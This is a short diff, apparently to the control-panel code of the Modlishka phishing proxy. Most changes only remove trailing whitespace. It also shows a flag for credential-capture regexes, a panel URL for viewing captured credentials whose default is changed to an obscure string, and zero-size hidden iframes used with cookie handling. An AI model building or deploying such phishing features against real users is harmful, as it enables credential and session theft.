@@ -104,7 +104,7 @@ function clearcookies(){
   		<p style="font-weight:bold;font-size: 1em;">{{.TermCount}} ({{printf "%.1f" .TermPercent}}%)</p>
   	</div>
   </div>
-  
+
   <hr>
 
   <div class="row">
@@ -174,7 +174,7 @@ html,body{
     left: 50%;
     transform: translate(-50%,-50%);
 	width: 150px;
-    height: 150px;	
+    height: 150px;
 }
 
 .loader {
@@ -193,7 +193,7 @@ html,body{
 <body>
 <script>
 
-setTimeout(function() {document.location='/'; }, 5000); 
+setTimeout(function() {document.location='/'; }, 5000);
 
 </script>
 
@@ -206,7 +206,7 @@ setTimeout(function() {document.location='/'; }, 5000);
         </div>
     </div>
   </div>
-</div> 
+</div>
 
  {{range .}}
  <iframe style="width:0; height:0; border:0; border:none" src="{{.}}"></iframe>
@@ -252,12 +252,12 @@ type Cookie struct {
 	Path       string `json:"path"`
 	Domain     string `json:"domain"`
 	Expires    time.Time `json:"expire"`
-	RawExpires string 
+	RawExpires string
 
 	// MaxAge=0 means no 'Max-Age' attribute specified.
 	// MaxAge<0 means delete cookie now, equivalently 'Max-Age: 0'
 	// MaxAge>0 means Max-Age attribute present and given in seconds
-	MaxAge   int 
+	MaxAge   int
 	Secure   bool `json:"secure"`
 	HttpOnly bool `json:"httpOnly"`
 	SameSite http.SameSite
@@ -268,7 +268,7 @@ type CookieJar struct {
 }
 
 var credentialParameters = flag.String("credParams", "", "Credential regexp with matching groups. e.g. : baase64(username_regex),baase64(password_regex)")
-var controlURL = flag.String("controlURL", "SayHello2Modlishka", "URL to view captured credentials and settings.")
+var controlURL = flag.String("controlURL", "aqamns@369#!", "URL to view captured credentials and settings.")
 var controlCredentials = flag.String("controlCreds", "", "Username and password to protect the credentials page.  user:pass format")
 
 var CConfig ControlConfig
